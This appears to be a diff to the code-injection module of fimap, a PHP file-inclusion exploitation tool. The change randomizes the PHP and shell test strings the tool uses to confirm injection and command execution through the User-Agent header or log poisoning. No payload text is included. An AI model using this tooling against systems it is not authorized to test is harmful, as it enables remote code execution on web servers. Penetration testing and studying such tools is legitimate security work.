@@ -100,20 +100,32 @@ class codeinjector(baseClass):
                 print "fimap is currently not configured to exploit RFI vulnerabilitys."
                 sys.exit(1)
 
-        code = self.__doHaxRequest(url, mode, settings["php_info"][0], suffix)
+        php_test_code = settings["php_info"][0]
+        php_test_result = settings["php_info"][1]
+
+        quiz, answer = self.getPHPQuiz()
+        php_test_code = php_test_code.replace("__PHP_QUIZ__", quiz)
+        php_test_result = php_test_result.replace("__PHP_ANSWER__", answer)
+
+        code = self.__doHaxRequest(url, mode, php_test_code, suffix)
         if code == None:
             self._log("php-code testing failed! code=None", self.LOG_ERROR)
             sys.exit(1)
 
 
-        if (code.find(settings["php_info"][1]) != -1):
+        if (code.find(php_test_result) != -1):
             self._log("PHP Injection works! Testing if execution works...", self.LOG_ALWAYS)
             php_inject_works = True
+            shell_test_code = settings["shell_test"][0]
+            shell_test_result = settings["shell_test"][1]
+            squiz, sanswer = self.getShellQuiz()
+            shell_test_code = shell_test_code.replace("__SHELL_QUIZ__", squiz)
+            shell_test_result = shell_test_result.replace("__SHELL_ANSWER__", sanswer)
             for item in settings["php_exec"]:
                 try:
                     name, payload = item
                     self._log("Testing execution thru '%s'..."%(name), self.LOG_INFO)
-                    testload = payload.replace("__PAYLOAD__", base64.b64encode(settings["shell_test"][0]))
+                    testload = payload.replace("__PAYLOAD__", base64.b64encode(shell_test_code))
                     if (mode.find("A") != -1):
                         self.setUserAgent(testload)
                         code = self.doGetRequest(url)
@@ -124,7 +136,7 @@ class codeinjector(baseClass):
                     elif (mode.find("L") != -1):
                         testload = self.convertUserloadToLogInjection(testload)
                         code = self.doPostRequest(url, testload)
-                    if code != None and code.find(settings["shell_test"][1]) != -1:
+                    if code != None and code.find(shell_test_result) != -1:
                         sys_inject_works = True
                         working_shell = item
                         self._log("Execution thru '%s' works!"%(name), self.LOG_INFO)
